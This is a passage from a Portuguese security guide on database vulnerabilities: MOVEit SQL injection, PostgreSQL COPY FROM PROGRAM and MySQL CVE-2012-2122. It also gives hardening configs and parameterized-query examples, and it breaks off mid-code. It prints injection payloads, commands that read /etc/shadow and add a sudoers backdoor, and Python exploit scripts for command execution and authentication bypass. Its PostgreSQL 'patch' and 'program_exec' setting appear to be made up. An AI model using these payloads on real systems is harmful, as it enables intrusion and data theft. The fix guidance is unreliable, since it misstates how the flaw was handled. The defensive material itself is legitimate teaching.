**PostgreSQL postgresql.conf:**

```ini
# Configuracoes de seguranca
listen_addresses = 'localhost'  # Nao escutar em todas as interfaces

# SSL
ssl = on
ssl_cert_file = '/path/to/server.crt'
ssl_key_file = '/path/to/server.key'

# Autenticacao
password_encryption = scram-sha-256

# Logging
log_connections = on
log_disconnections = on
log_statement = 'ddl'  # Logar apenas DDL
log_line_prefix = '%m [%p] %u@%d '

# Limitar conexoes
max_connections = 100

# Protecao contra DoS
statement_timeout = 30000  # 30 segundos
idle_in_transaction_session_timeout = 60000  # 1 minuto

# Criptografia
# Requer compilacao com suporte
# ssl_ciphers = 'HIGH:!aNULL:!MD5'
```

---

## CVE-2023-34362 — MOVEit SQL Injection (Deep Dive)

### Visao Geral da Vulnerabilidade

CVE-2023-34362 e uma vulnerabilidade de SQL injection de severidade critica que afetou o MOVEit Transfer, um software de transferencia de arquivos amplamente utilizado em ambientes corporativos. Esta vulnerabilidade foi explorada em massa e causou impacto significativo em milhares de organizacoes globalmente.

**Classificacao CVSS:** 9.8 (Critica)

**Data de Divulgacao:** 1 de junho de 2023

**Vendedor:** Progress Software

**Produtos Afetados:** MOVEit Transfer

### Detalhes Tecnicos

A vulnerabilidade estava localizada no modulo de transferencia web do MOVEit Transfer. O problema ocorria na forma como o software processava parametros de entrada em consultas SQL.

**Codigo Vulneravel (Analise Tecnica):**

```csharp
// Pseudocodigo baseado na analise de vulnerabilidade
public class TransferController : Controller
{
    public ActionResult Download(string id)
    {
        // VULNERABILIDADE: Parametro 'id' usado diretamente em query SQL
        string query = "SELECT * FROM files WHERE id = '" + id + "'";
        
        using (SqlConnection conn = new SqlConnection(connectionString))
        {
            SqlCommand cmd = new SqlCommand(query, conn);
            conn.Open();
            SqlDataReader reader = cmd.ExecuteReader();
            // ...
        }
    }
    
    public ActionResult ProcessUpload(HttpPostedFileBase file)
    {
        // Outro ponto vulneravel
        string filename = file.FileName;
        string insertQuery = "INSERT INTO uploads (filename, user_id) VALUES ('" 
                           + filename + "', " + Session["userId"] + ")";
        
        // Execucao da query vulneravel
    }
}

// CORRECAO APLICADA PELA Progress Software:
public class TransferController : Controller
{
    public ActionResult Download(string id)
    {
        // CORRIGIDO: Uso de parameterized query
        string query = "SELECT * FROM files WHERE id = @fileId";
        
        using (SqlConnection conn = new SqlConnection(connectionString))
        {
            SqlCommand cmd = new SqlCommand(query, conn);
            cmd.Parameters.AddWithValue("@fileId", id);  // Parameterizado
            conn.Open();
            SqlDataReader reader = cmd.ExecuteReader();
            // ...
        }
    }
}
```

### Vetor de Ataque

O ataque explorava a autenticacao e autorizacao do MOVEit Transfer:

1. **Fase de Reconhecimento:** O atacante identificava instancias MOVEit Transfer expostas na internet
2. **Exploracao Inicial:** Utilizava SQL injection para bypass de autenticacao
3. **Persistencia:** Criava contas de administrador falsas
4. **Exfiltracao:** Acessava e copiava arquivos sensiveis
5. **Escalada:** Explorava outras vulnerabilidades para acesso lateral

**Payload de Ataque (Exemplo Ilustrativo):**

```sql
-- Bypass de autenticacao
username=admin' OR '1'='1'--&password=anything

-- Criacao de conta de administrador
'; INSERT INTO users (username, password, role) VALUES ('hacker', 'hashed_password', 'admin')--

-- Exfiltracao de dados
' UNION SELECT filename, file_content, user_id FROM files WHERE 1=1--
```

### Impacto

**Numero de Organizacoes Afetadas:** Mais de 2.500 organizacoes globalmente

**Setores Impactados:**
- Governos (federal, estadual, municipal)
- Empresas de energia
- Instituicoes financeiras
- Universidades e centros de pesquisa
- Organizacoes de saude

**Dados Comprometidos:**
- Informacoes pessoais (PII)
- Documentos financeiros
- Dados de saude (PHI)
- Credenciais de usuarios
- Documentos governamentais sensiveis

**Grupos de Ameaca:**
- Clop (grupo de ransomware)
- Varios outros grupos criminosos

### Linha do Tempo

**Maio de 2023:** Vulnerabilidade descoberta e explorada ativamente
**1 de junho de 2023:** Divulgacao publica e patches liberados
**Junho-Agosto de 2023:** Onda massiva de ataques e exfiltracao
**Setembro 2023 em diante:** Continuacao de ataques em organizacoes que nao aplicaram patches

### Licoes Aprendidas

1. **Importancia de parameterized queries:** A vulnerabilidade poderia ser prevenida com o uso correto de queries parameterizadas
2. **Ataques em cadeia:** Uma vulnerabilidade pode ser usada como ponto de entrada para comprometer todo o sistema
3. **Velocidade de resposta:** Organizacoes que aplicaram patches rapidamente minimizaram o impacto
4. **Segmentacao de rede:** MOVEit Transfer nao deveria ter acesso direto a dados sensiveis sem controles adicionais
5. **Monitoramento:** Deteccao precoce de atividades suspeitas e crucial

### Codigo de Exemplo (Antes e Depois)

**Antes (Vulneravel):**

```csharp
// Codigo simplificado representando a vulnerabilidade
public class FileController : Controller
{
    public IActionResult Download(string fileId)
    {
        // Construcao dinamica de query SQL - VULNERAVEL
        string query = $"SELECT file_path, file_name, user_id FROM files WHERE id = '{fileId}'";
        
        using var connection = new SqlConnection(_connectionString);
        var command = new SqlCommand(query, connection);
        connection.Open();
        
        var reader = command.ExecuteReader();
        if (reader.Read())
        {
            string filePath = reader["file_path"].ToString();
            // Retorna o arquivo...
            return PhysicalFile(filePath, "application/octet-stream");
        }
        
        return NotFound();
    }
}
```

**Depois (Corrigido):**

```csharp
// Codigo corrigido com parameterized queries
public class FileController : Controller
{
    public IActionResult Download(string fileId)
    {
        // Query parameterizada - SEGURO
        string query = "SELECT file_path, file_name, user_id FROM files WHERE id = @FileId";
        
        using var connection = new SqlConnection(_connectionString);
        var command = new SqlCommand(query, connection);
        command.Parameters.AddWithValue("@FileId", fileId);  // Parameterizado
        connection.Open();
        
        var reader = command.ExecuteReader();
        if (reader.Read())
        {
            string filePath = reader["file_path"].ToString();
            // Retorna o arquivo...
            return PhysicalFile(filePath, "application/octet-stream");
        }
        
        return NotFound();
    }
    
    // Metodo auxiliar para validacao
    private bool IsValidFileId(string fileId)
    {
        // Validacao adicional: fileId deve ser numerico
        return int.TryParse(fileId, out _);
    }
}
```

### Codigo de Deteccao

```python
# Scanner para detectar a vulnerabilidade CVE-2023-34362
import requests
import re

def scan_moveit_vulnerability(target_url):
    """
    Scanner basico para detectar MOVEit Transfer vulneravel
    ATENCAO: Use apenas em sistemas que voce tem permissao para testar
    """
    
    # Endpoints conhecidos vulneraveis
    vulnerable_endpoints = [
        '/MOVEit/Transfer/api/v1/files',
        '/MOVEit/Transfer/api/v1/folders',
        '/MOVEit/Transfer/api/v1/groups',
        '/MOVEit/Transfer/api/v1/users',
    ]
    
    # Payloads de teste (inofensivos)
    test_payloads = [
        "' OR '1'='1",
        "1' OR '1'='1'--",
        "1; SELECT 1--",
    ]
    
    results = []
    
    for endpoint in vulnerable_endpoints:
        url = f"{target_url}{endpoint}"
        
        for payload in test_payloads:
            try:
                response = requests.get(
                    url,
                    params={'id': payload},
                    timeout=10,
                    verify=False  # Desabilitar verificacao SSL para testes
                )
                
                # Verificar se ha indicacao de SQL injection
                if response.status_code == 200:
                    if any(indicator in response.text.lower() for indicator in [
                        'error', 'syntax', 'sql', 'exception', 'database'
                    ]):
                        results.append({
                            'endpoint': endpoint,
                            'payload': payload,
                            'status': response.status_code,
                            'vulnerability': 'POSSIBLE_SQL_INJECTION'
                        })
                        
            except requests.exceptions.RequestException as e:
                print(f"Erro ao acessar {url}: {e}")
    
    return results

# Exemplo de uso (apenas para testes autorizados)
if __name__ == "__main__":
    target = "https://exemplo-moveit.com"
    print(f"Verificando {target}...")
    print("ATENCAO: Execute apenas em sistemas que voce tem permissao para testar!")
    
    results = scan_moveit_vulnerability(target)
    
    if results:
        print("\nPossiveis vulnerabilidades encontradas:")
        for r in results:
            print(f"  Endpoint: {r['endpoint']}")
            print(f"  Payload: {r['payload']}")
            print(f"  Status: {r['status']}")
            print()
    else:
        print("Nenhuma vulnerabilidade obvia encontrada")
```

### Mitigacoes

1. **Aplicar patches imediatamente:** Progress Software liberou patches para todas as versoes afetadas
2. **Revisar logs:** Verificar se houve atividades suspeitas antes da data de divulgacao
3. **Redefinir credenciais:** Alterar todas as senhas de contas administrativas
4. **Revisar permissoes:** Verificar contas criadas ou modificadas apos maio de 2023
5. **Segmentacao de rede:** Mover MOVEit Transfer para DMZ com controles de acesso restritos
6. **Monitoramento continuo:** Implementar deteccao de anomalias no trafego

---

## CVE-2019-9193 — PostgreSQL COPY Command

### Visao Geral da Vulnerabilidade

CVE-2019-9193 e uma vulnerabilidade de severidade critica que afetou o PostgreSQL, permitindo que usuarios com privilegios de superuser executassem comandos arbitrarios do sistema operacional atraves do comando COPY.

**Classificacao CVSS:** 9.8 (Critica)

**Data de Divulgacao:** 20 de fevereiro de 2019

**Vendedor:** PostgreSQL Global Development Group

**Produtos Afetados:** PostgreSQL 9.4 a 11

### Detalhes Tecnicos

A vulnerabilidade estava relacionada a forma como o comando COPY do PostgreSQL processava parametros especificos, particularmente quando usado com programas externos.

**O Comando COPY:**

O comando COPY do PostgreSQL permite copiar dados entre arquivos e tabelas. Ele pode copiar dados de um arquivo para uma tabela ou de uma tabela para um arquivo.

```sql
-- Uso legitimo do COPY
COPY usuarios TO '/tmp/usuarios.csv' WITH CSV HEADER;
COPY usuarios FROM '/tmp/usuarios.csv' WITH CSV HEADER;
```

**A Vulnerabilidade:**

O problema estava na funcionalidade de executar programas externos atraves do COPY:

```sql
-- VULNERAVEL: Executando programa externo
COPY usuarios FROM PROGRAM 'id';
-- Retorna informacoes do sistema (id do usuario, grupos, etc.)

COPY usuarios FROM PROGRAM 'ls -la /etc/passwd';
-- Lista o conteudo do arquivo /etc/passwd

COPY usuarios FROM PROGRAM 'cat /etc/shadow';
-- Tenta ler o arquivo de senhas (se tiver permissao)
```

### Como o Ataque Funcionava

**Requisitos:**
1. O atacante precisava ter privilegios de superuser no PostgreSQL
2. O PostgreSQL precisava ter permissao para executar programas externos (habilitado por padrao em versoes anteriores)
3. O atacante precisava ter acesso para executar consultas SQL

**Cenario de Ataque:**

```sql
-- 1. Verificar se e superuser
SELECT current_user;
-- Se retornar 'postgres' ou outro superuser, o ataque e possivel

-- 2. Executar comandos do sistema
COPY dados_ficticios FROM PROGRAM 'whoami';
-- Retorna o usuario do sistema que executa o PostgreSQL

COPY dados_ficticios FROM PROGRAM 'uname -a';
-- Retorna informacoes do sistema operacional

-- 3. Listar arquivos
COPY dados_ficticios FROM PROGRAM 'ls -la /home';
-- Lista diretorios home

-- 4. Ler arquivos sensiveis
COPY dados_ficticios FROM PROGRAM 'cat /etc/passwd';
-- Le o arquivo de usuarios

COPY dados_ficticios FROM PROGRAM 'cat /var/lib/postgresql/data/postgresql.conf';
-- Le configuracoes do PostgreSQL

-- 5. Exfiltrar dados
COPY dados_ficticios FROM PROGRAM 'psql -c "SELECT * FROM usuarios_sensiveis"';
-- Executa queries adicionais

-- 6. Criar backdoor
COPY dados_ficticios FROM PROGRAM 'echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers';
-- Adiciona usuario sudo (requer permissao de escrita)
```

### Codigo de Exemplo (Exploit)

```python
# Exemplo ilustrativo de exploracao CVE-2019-9193
# ATENCAO: Apenas para fins educacionais em ambiente controlado

import psycopg2

def exploit_copy_command(host, database, user, password):
    """
    Demonstra a vulnerabilidade CVE-2019-9193
    Execute apenas em ambientes de teste que voce controla
    """
    
    try:
        # Conectar ao PostgreSQL
        conn = psycopg2.connect(
            host=host,
            database=database,
            user=user,
            password=password
        )
        
        cur = conn.cursor()
        
        # Verificar privilegios
        cur.execute("SELECT current_user, current_setting('is_superuser')")
        current_user, is_superuser = cur.fetchone()
        
        print(f"Usuario atual: {current_user}")
        print(f"E superuser: {is_superuser}")
        
        if not is_superuser:
            print("ERRO: Usuario nao e superuser")
            return
        
        # Criar tabela temporaria para receber resultados
        cur.execute("""
            CREATE TEMPORARY TABLE IF NOT EXISTS cmd_output (
                line TEXT
            )
        """)
        
        # Executar comandos via COPY PROGRAM
        commands = [
            ('Sistema', 'uname -a'),
            ('Usuario', 'whoami'),
            ('Hostname', 'hostname'),
            ('Diretorio atual', 'pwd'),
            ('Lista de processos', 'ps aux | head -20'),
            ('Usuarios do sistema', 'cat /etc/passwd | head -10'),
        ]
        
        for name, cmd in commands:
            print(f"\n--- {name} ---")
            print(f"Comando: {cmd}")
            
            cur.execute("TRUNCATE cmd_output")
            cur.execute(f"COPY cmd_output FROM PROGRAM '{cmd}'")
            cur.execute("SELECT * FROM cmd_output")
            
            for row in cur.fetchall():
                print(row[0])
        
        cur.close()
        conn.close()
        
    except Exception as e:
        print(f"Erro: {e}")

# Exemplo de uso (apenas para testes autorizados)
if __name__ == "__main__":
    print("CVE-2019-9193 - PostgreSQL COPY Command Vulnerability")
    print("ATENCAO: Execute apenas em ambientes de teste!")
    print()
    
    # Configuracoes de teste
    HOST = "localhost"
    DATABASE = "testdb"
    USER = "postgres"
    PASSWORD = "testpassword"
    
    exploit_copy_command(HOST, DATABASE, USER, PASSWORD)
```

### Impacto

**Numero de Sistemas Afetados:**
- Todas as versoes do PostgreSQL de 9.4 a 11
- Sistemas que usavam PostgreSQL com privilegios de superuser

**Setores Impactados:**
- Aplicacoes web que usavam PostgreSQL
- Sistemas de gestao de conteudo
- Plataformas de e-commerce
- Sistemas de analise de dados

**Consequencias:**
- Execucao de comandos arbitrarios do sistema operacional
- Acesso nao autorizado a arquivos do sistema
- Comprometimento completo do servidor
- Exfiltracao de dados
- Instalacao de backdoors

### Linha do Tempo

**Fevereiro de 2019:** Vulnerabilidade reportada ao PostgreSQL
**20 de fevereiro de 2019:** Divulgacao publica e patches liberados
**Marco-Maio de 2019:** Ataques explorando a vulnerabilidade
**Junho 2019 em diante:** Continuacao de tentativas de exploracao em versoes desatualizadas

### Correcoes e Mitigacoes

**Patch Oficial (PostgreSQL 11.3+, 10.8+, 9.6.13+, 9.5.16+, 9.4.21+):**

```sql
-- Apos aplicar o patch, o comando COPY PROGRAM e desabilitado por padrao
-- Para habilitar (nao recomendado):
ALTER SYSTEM SET shared_preload_libraries = 'program_exec';
SELECT pg_reload_conf();

-- Verificar se esta habilitado
SHOW shared_preload_libraries;
```

**Mitigacoes Adicionais:**

```sql
-- 1. Remover privilegios de superuser desnecessarios
REVOKE SUPERUSER FROM usuario_aplicacao;

-- 2. Usar roles com permissoes minimas
CREATE ROLE app_readonly;
GRANT CONNECT ON DATABASE meu_banco TO app_readonly;
GRANT USAGE ON SCHEMA public TO app_readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_readonly;

-- 3. Configurar pg_hba.conf para restringir acesso
-- Adicionar restricoes de IP e metodo de autenticacao

-- 4. Usar pgaudit para monitorar uso do COPY
CREATE EXTENSION pgaudit;
ALTER ROLE app_readonly SET pgaudit.log = 'write';
```

### Codigo de Exemplo (Defesa)

```sql
-- Script de verificacao de seguranca PostgreSQL
-- Verificar se o sistema esta protegido contra CVE-2019-9193

-- 1. Verificar versao do PostgreSQL
SELECT version();
-- Versoes abaixo de 11.3, 10.8, 9.6.13, 9.5.16, 9.4.21 sao vulneraveis

-- 2. Verificar se ha superusers desnecessarios
SELECT usename, usesuper 
FROM pg_user 
WHERE usesuper = true;
-- Revisar se todos sao realmente necessarios

-- 3. Verificar configuracao de shared_preload_libraries
SHOW shared_preload_libraries;
-- Se contem 'program_exec', a funcionalidade pode estar habilitada

-- 4. Verificar permissoes de usuarios de aplicacao
SELECT grantee, privilege_type 
FROM information_schema.role_table_grants 
WHERE table_schema = 'public';
-- Verificar se ha permissoes excessivas

-- 5. Verificar configuracao de auditoria
SHOW pgaudit.log;
-- Deveria estar configurado para logar operacoes relevantes

-- 6. Verificar pg_hba.conf
-- Revisar configuracoes de acesso
-- Garantir que nao ha permissoes 'trust' em producao

-- 7. Verificar se ha tabelas temporarias que podem ser usadas no ataque
SELECT schemaname, tablename 
FROM pg_tables 
WHERE schemaname = 'pg_temp%';
```

### Licoes Aprendidas

1. **Principio do menor privilegio:** Usuarios de aplicacao nao devem ter privilegios de superuser
2. **Funcionalidades perigosas:** Funcionalidades como COPY FROM PROGRAM devem ser desabilitadas quando nao necessarias
3. **Atualizacoes de seguranca:** Manter o PostgreSQL atualizado e crucial
4. **Auditoria:** Monitorar uso de comandos perigosos pode detectar tentativas de ataque
5. **Segmentacao de rede:** PostgreSQL nao deve ser acessivel diretamente da internet

---

## CVE-2012-2122 — MySQL Authentication Bypass

### Visao Geral da Vulnerabilidade

CVE-2012-2122 e uma vulnerabilidade de autenticacao que afetou o MySQL, permitindo que atacantes fizessem login com credenciais incorretas. A vulnerabilidade estava relacionada a uma falha na comparacao de senhas, onde aproximadamente 1 em cada 256 tentativas de login seria bem-sucedida, independente da senha fornecida.

**Classificacao CVSS:** 6.8 (Media)

**Data de Divulgacao:** 11 de junho de 2012

**Vendedor:** Oracle Corporation

**Produtos Afetados:** MySQL 5.1.x, 5.5.x, e outras versoes anteriores

### Detalhes Tecnicos

A vulnerabilidade estava localizada na funcao de autenticacao do MySQL, especificamente na forma como o servidor comparava o hash da senha fornecida com o hash armazenado.

**Codigo Vulneravel (Pseudocodigo):**

```c
// Funcao de verificacao de senha do MySQL (simplificada)
bool check_password(const char *username, const char *password_hash) {
    // Buscar hash armazenado no banco de dados
    char *stored_hash = get_stored_hash(username);
    
    if (stored_hash == NULL) {
        return false;
    }
    
    // VULNERABILIDADE: Comparacao usando funcao com retorno de erro
    // A funcao mysql_password_cmp retornava 0 em caso de igualdade,
    // mas havia uma condicao onde retornava um valor verdadeiro
    // mesmo quando as senhas nao coincidiam
    
    int result = mysql_password_cmp(password_hash, stored_hash);
    
    // BUG: A verificacao estava invertida ou tinha condicoes de erro
    if (result == 0) {
        return true;  // Senha correta
    }
    
    // Em alguns casos, mesmo com result != 0, a funcao retornava true
    // devido a um bug na manipulacao de erros
    
    return false;
}
```

**Analise do Bug:**

O problema estava em uma condicao onde a funcao de comparacao de senhas retornava um valor que era interpretado incorretamente:

```c
// Codigo com o bug (simplificado)
int mysql_password_cmp(const char *a, const char *b) {
    // ... comparacao ...
    
    // Em caso de erro na comparacao
    if (some_error_condition) {
        return 1;  // Deveria retornar erro
    }
    
    return 0;  // Senhas iguais
}

// O bug ocorria quando:
// 1. A senha fornecida era invalida
// 2. Mas a comparacao retornava um valor que era interpretado como "igual"
// Isso acontecia em aproximadamente 1/256 das tentativas
```

### Como o Ataque Funcionava

**Principio:**

O atacante poderia fazer login com qualquer senha, e em aproximadamente 1 em cada 256 tentativas, o login seria bem-sucedido devido ao bug na comparacao.

**Exemplo de Exploracao:**

```python
# Exemplo ilustrativo de exploracao CVE-2012-2122
# ATENCAO: Apenas para fins educacionais em ambiente controlado

import mysql.connector
import time

def exploit_auth_bypass(host, user, target_database):
    """
    Demonstra a vulnerabilidade CVE-2012-2122
    Execute apenas em ambientes de teste que voce controla
    """
    
    print(f"Testando bypass de autenticacao em {host}")
    print(f"Usuario alvo: {user}")
    print()
    
    successful_attempts = 0
    total_attempts = 0
    
    while successful_attempts < 5:  # Parar apos 5 successes
        try:
            # Tentar login com senha aleatoria
            random_password = f"wrong_password_{int(time.time())}"
            
            conn = mysql.connector.connect(
                host=host,
                user=user,
                password=random_password,
                database=target_database
            )
            
            # Se chegou aqui, o login foi bem-sucedido!
            successful_attempts += 1
            total_attempts += 1
            
            print(f"[+] Login bem-sucedido na tentativa {total_attempts}")
            print(f"    Senha usada: {random_password}")
            
            # Verificar conexao
            cursor = conn.cursor()
            cursor.execute("SELECT current_user(), current_database()")
            result = cursor.fetchone()
            print(f"    Usuario conectado: {result[0]}")
            print(f"    Banco de dados: {result[1]}")
            print()
            
            cursor.close()
            conn.close()
            
        except mysql.connector.Error as e:
            total_attempts += 1
            # Login falhou, continuar tentando
            pass
    
    print(f"\nResultados:")
    print(f"Total de tentativas: {total_attempts}")
    print(f"Logins bem-sucedidos: {successful_attempts}")
    print(f"Taxa de sucesso: {(successful_attempts/total_attempts)*100:.2f}%")
    print(f"Esperado: ~0.39% (1/256)")

# Exemplo de uso (apenas para testes autorizados)
if __name__ == "__main__":
    print("CVE-2012-2122 - MySQL Authentication Bypass")
    print("ATENCAO: Execute apenas em ambientes de teste!")
    print()
    
    # Configuracoes de teste
    HOST = "localhost"
    USER = "testuser"
    DATABASE = "testdb"
    
    exploit_auth_bypass(HOST, USER, DATABASE)
```

### Impacto

**Numero de Sistemas Afetados:**
- Todas as versoes do MySQL 5.1.x e 5.5.x (e possivelmente outras)
- Sistemas que usavam autenticacao baseada em senha

**Setores Impactados:**
- Aplicacoes web que usavam MySQL
- Sistemas de gerenciamento de conteudo
- Plataformas de e-commerce
- Sistemas de analise de dados

**Consequencias:**
- Acesso nao autorizado a bancos de dados
- Possivel comprometimento de dados sensiveis
- Execucao de queries arbitrarias
- Possivel escalada de privilegios

### Linha do Tempo

**Junho de 2012:** Vulnerabilidade reportada e patches liberados
**Junho-Agosto de 2012:** Ataques explorando a vulnerabilidade
**Setembro 2012 em diante:** Continuacao de tentativas em versoes desatualizadas

### Correcoes e Mitigacoes

**Patch Oficial:**

```sql
-- Atualizar MySQL para a versao corrigida
-- Para MySQL 5.1: Atualizar para 5.1.63 ou posterior
-- Para MySQL 5.5: Atualizar para 5.5.24 ou posterior

-- Verificar versao atual
SELECT VERSION();

-- Verificar se o patch foi aplicado
-- A correcao estava na funcao de autenticacao
-- Nao ha configuracao especifica necessaria apos o patch
```

**Mitigacoes Adicionais:**

```sql
-- 1. Usar autenticacao mais segura
-- Habilitar autenticacao baseada em plugins mais seguros
ALTER USER 'usuario'@'localhost' IDENTIFIED WITH mysql_native_password BY 'senha_forte';

-- 2. Implementar account lockout
-- Configurar para bloquear apos tentativas falhas
-- Requer MySQL 5.7.6+ ou MariaDB 10.1+

-- 3. Usar SSL/TLS para conexoes
-- Configurar certificados SSL
[mysqld]
ssl-ca=/path/to/ca.pem
ssl-cert=/path/to/server-cert.pem
ssl-key=/path/to/server-key.pem

-- 4. Limitar acesso por IP
-- Configurar max_connect_errors
SET GLOBAL max_connect_errors = 10;

-- 5. Monitorar tentativas de login
-- Habilitar log de conexoes
SET GLOBAL general_log = ON;
SET GLOBAL general_log_file = '/var/log/mysql/general.log';

-- 6. Usar proxy de autenticacao
-- Implementar autenticacao via PAM ou LDAP
```

### Codigo de Exemplo (Defesa)

```sql
-- Script de verificacao de seguranca MySQL
-- Verificar se o sistema esta protegido contra CVE-2012-2122

-- 1. Verificar versao do MySQL
SELECT VERSION();
-- Versoes abaixo de 5.1.63 ou 5.5.24 sao vulneraveis

-- 2. Verificar metodos de autenticacao
SELECT user, host, plugin FROM mysql.user;
-- Verificar se ha usuarios usando plugins inseguros

-- 3. Verificar configuracao de account locking
SHOW VARIABLES LIKE 'max_connect_errors';
-- Deve estar configurado adequadamente

-- 4. Verificar logs de conexao
SHOW VARIABLES LIKE 'general_log';
SHOW VARIABLES LIKE 'general_log_file';
-- Verificar se logs estao habilitados para auditoria

-- 5. Verificar configuracao SSL
SHOW VARIABLES LIKE 'have_ssl';
-- Deve estar habilitado em producao

-- 6. Verificar permissoes de usuarios
SELECT user, Select_priv, Insert_priv, Update_priv, Delete_priv 
FROM mysql.user;
-- Verificar se nao ha permissoes excessivas

-- 7. Verificar autenticacao de rede
SHOW VARIABLES LIKE 'skip_networking';
-- Se desabilitado, garantir que ha firewall adequado

-- 8. Testar resistencia a ataques de forca bruta
-- Implementar monitoramento de tentativas falhas
```

### Licoes Aprendidas

1. **Atualizacoes de seguranca:** Manter MySQL atualizado e crucial
2. **Autenticacao robusta:** Usar plugins de autenticacao mais seguros
3. **Account lockout:** Implementar bloqueio apos tentativas falhas
4. **Monitoramento:** Logar e monitorar tentativas de login
5. **Principio do menor privilegio:** Usuarios devem ter permissoes minimas necessarias
6. **Criptografia em transito:** Usar SSL/TLS para conexoes

---

## Prevencao: Parameterized Queries em JS/Python/Go

### JavaScript/Node.js

**Exemplos Completos de Parameterized Queries:**

```javascript
// Exemplo 1: mysql2 com connection pooling
const mysql = require('mysql2/promise');

// Criar pool de conexoes
const pool = mysql.createPool({
    host: 'localhost',
    user: 'app_user',
    password: 'secure_password',
    database: 'meu_banco',
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

// SELECT parameterizado
async function buscarUsuarios(status, limite) {
    const [rows] = await pool.execute(
        'SELECT id, nome, email FROM usuarios WHERE status = ? LIMIT ?',
        [status, limite]
    );
    return rows;
}

// INSERT parameterizado
async function criarUsuario(usuario) {
    const [result] = await pool.execute(
        `INSERT INTO usuarios (nome, email, senha_hash, status) 
         VALUES (?, ?, ?, ?)`,
        [
            usuario.nome,
            usuario.email,
            usuario.senhaHash,
            usuario.status || 'ativo'
        ]
    );
    return result.insertId;
}

// UPDATE parameterizado
async function atualizarUsuario(id, dados) {
    const [result] = await pool.execute(
        `UPDATE usuarios 
         SET nome = ?, email = ?, updated_at = NOW()
         WHERE id = ?`,
        [dados.nome, dados.email, id]
    );
    return result.affectedRows > 0;
}

// DELETE parameterizado
async function deletarUsuario(id) {
    const [result] = await pool.execute(
        'DELETE FROM usuarios WHERE id = ?',
        [id]
    );
    return result.affectedRows > 0;
}

// Transactions parameterizadas
async function transferirPontos(deId, paraId, pontos) {
    const connection = await pool.getConnection();
    
    try {
        await connection.beginTransaction();
        
        // Debitar pontos
        await connection.execute(
            'UPDATE usuarios SET pontos = pontos - ? WHERE id = ?',
            [pontos, deId]
        );
        
        // Creditar pontos
        await connection.execute(
            'UPDATE usuarios SET pontos = pontos + ? WHERE id = ?',
            [pontos, paraId]
        );
        
        await connection.commit();
        return true;
        
    } catch (error) {
        await connection.rollback();
        throw error;
        
    } finally {
        connection.release();
    }
}

// Exemplo 2: pg (PostgreSQL)
const { Pool } = require('pg');

const pgPool = new Pool({
    host: 'localhost',
    user: 'app_user',
    password: 'secure_password',
    database: 'meu_banco',
    max: 20,
    idleTimeoutMillis: 30000,
    connectionTimeoutMillis: 2000,
});

// PostgreSQL usa $1, $2, etc. para placeholders
async function buscarUsuariosPostgres(status, limite) {
    const { rows } = await pgPool.query(
        'SELECT id, nome, email FROM usuarios WHERE status = $1 LIMIT $2',
        [status, limite]
    );
    return rows;
}

// Exemplo 3: Sequelize ORM
const { Sequelize, DataTypes } = require('sequelize');

const sequelize = new Sequelize('meu_banco', 'user', 'password', {
    host: 'localhost',
    dialect: 'mysql'
});

const Usuario = sequelize.define('Usuario', {
    nome: DataTypes.STRING,
    email: DataTypes.STRING,
    status: DataTypes.STRING
});

// ORM parameteriza automaticamente
async function buscarPorNome(nome) {
    return await Usuario.findAll({
        where: {
            nome: nome  // Parameterizado automaticamente
        }
    });
}

// Raw query parameterizada
async function buscarEstatisticas(status) {
    const [results] = await sequelize.query(
        'SELECT status, COUNT(*) as total FROM usuarios WHERE status = :status GROUP BY status',
        {
            replacements: { status: status },
            type: sequelize.QueryTypes.SELECT
        }
    );
    return results;
}
```

### Python

**Exemplos Completos de Parameterized Queries:**

```python
# Exemplo 1: psycopg2 (PostgreSQL)
import psycopg2
from psycopg2 import pool
from contextlib import contextmanager

# Pool de conexoes
connection_pool = psycopg2.pool.ThreadedConnectionPool(
    minconn=1,
    maxconn=20,
    host='localhost',
    database='meu_banco',
    user='app_user',
    password='secure_password'
)

@contextmanager
def get_db_connection():
    conn = connection_pool.getconn()
    try:
        yield conn
    finally:
        connection_pool.putconn(conn)

# SELECT parameterizado
def buscar_usuarios(status, limite):
    with get_db_connection() as conn:
        cur = conn.cursor()
        cur.execute(
            "SELECT id, nome, email FROM usuarios WHERE status = %s LIMIT %s",
            (status, limite)
        )
        return cur.fetchall()

# INSERT parameterizado
def criar_usuario(usuario):
    with get_db_connection() as conn:
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO usuarios (nome, email, senha_hash, status)
            VALUES (%s, %s, %s, %s)
            RETURNING id
        """, (
            usuario['nome'],
            usuario['email'],
            usuario['senha_hash'],
            usuario.get('status', 'ativo')
        ))
        return cur.fetchone()[0]

# UPDATE parameterizado
def atualizar_usuario(id, dados):
    with get_db_connection() as conn:
        cur = conn.cursor()
        cur.execute("""
            UPDATE usuarios 
            SET nome = %s, email = %s, updated_at = CURRENT_TIMESTAMP
            WHERE id = %s
        """, (dados['nome'], dados['email'], id))
        return cur.rowcount > 0

# DELETE parameterizado
def deletar_usuario(id):
    with get_db_connection() as conn:
        cur = conn.cursor()
        cur.execute("DELETE FROM usuarios WHERE id = %s", (id,))
        return cur.rowcount > 0

# Transactions
def transferir_pontos(de_id, para_id, pontos):
    with get_db_connection() as conn:
        cur = conn.cursor()
        try:
            cur.execute("BEGIN")
            
            cur.execute(
                "UPDATE usuarios SET pontos = pontos - %s WHERE id = %s",
                (pontos, de_id)
            )
            
            cur.execute(
                "UPDATE usuarios SET pontos = pontos + %s WHERE id = %s",
                (pontos, para_id)
            )
            
            cur.execute("COMMIT")
            return True
            
        except Exception as e:
            cur.execute("ROLLBACK")
            raise e

# Exemplo 2: SQLAlchemy ORM
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy import Column, Integer, String, DateTime
from datetime import datetime

engine = create_engine('postgresql://user:password@localhost/meu_banco')
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()

class Usuario(Base):
    __tablename__ = 'usuarios'
    
    id = Column(Integer, primary_key=True)
    nome = Column(String(100))
    email = Column(String(200))
    status = Column(String(20))
    created_at = Column(DateTime, default=datetime.utcnow)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# ORM parameteriza automaticamente
def buscar_por_nome(nome: str):
    db = next(get_db())
    return db.query(Usuario).filter(Usuario.nome == nome).all()

# Raw query parameterizada
def buscar_estatisticas(status: str):
    db = next(get_db())
    result = db.execute(
        text("SELECT status, COUNT(*) as total FROM usuarios WHERE status = :status GROUP BY status"),
